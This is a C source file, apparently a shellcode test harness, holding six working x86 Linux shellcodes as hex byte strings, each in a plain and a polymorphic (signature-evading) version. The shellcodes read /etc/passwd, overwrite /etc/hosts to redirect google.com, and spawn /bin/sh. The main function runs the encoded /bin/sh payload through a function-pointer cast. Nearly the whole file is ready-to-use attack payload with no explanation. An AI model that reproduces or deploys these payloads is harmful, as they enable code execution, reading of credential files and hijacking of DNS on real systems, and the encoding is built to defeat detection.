#include<stdio.h>
#include<string.h>

//non poly cat /etc/passwd : 46 bytes
//unsigned char code[] = \
"\x89\xc3\x31\xd8\x31\xd2\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

//poly cat /etc/passwd : 60 bytes
//unsigned char code[] = \
"\x31\xc0\x99\x52\xbe\x1e\x52\x50\x63\x81\xc6\x11\x11\x11\x11\x56\xbe\x40\x73\x7a\x7f\x81\xee\x11\x11\x11\x11\x56\x89\xe3\x52\xbe\x73\x73\x77\x64\x56\xbe\x2f\x2f\x70\x61\x56\xbe\x2f\x65\x74\x63\x56\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

//non poly modify hosts : 77 bytes
//unsigned char code[] =\
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";

//poly modify hosts : 112 bytes
//unsigned char code[]=\
"\x31\xc9\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\x83\xec\x04\xbe\x5e\x62\x63\x62\x81\xc6\x11\x11\x11\x11\x56\xbe\x40\x40\x40\x79\x81\xee\x11\x11\x11\x11\x56\xbe\x40\x76\x85\x74\x81\xee\x11\x11\x11\x11\x56\x54\x5b\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x18\x59\x6a\x14\x5e\x87\xfe\x87\xd7\xcd\x80\x6a\x06\x5e\x87\xfe\x97\xcd\x80\x6a\x01\x5f\x97\xcd\x80\xe8\xe3\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";

//non poly  execve /bin/sh : 23 bytes
//unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

//polyexecve /bin/sh : 32 bytes
unsigned char code[] =\
"\x31\xc0\x50\xbe\x40\x40\x84\x79\x81\xee\x11\x11\x11\x11\x56\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
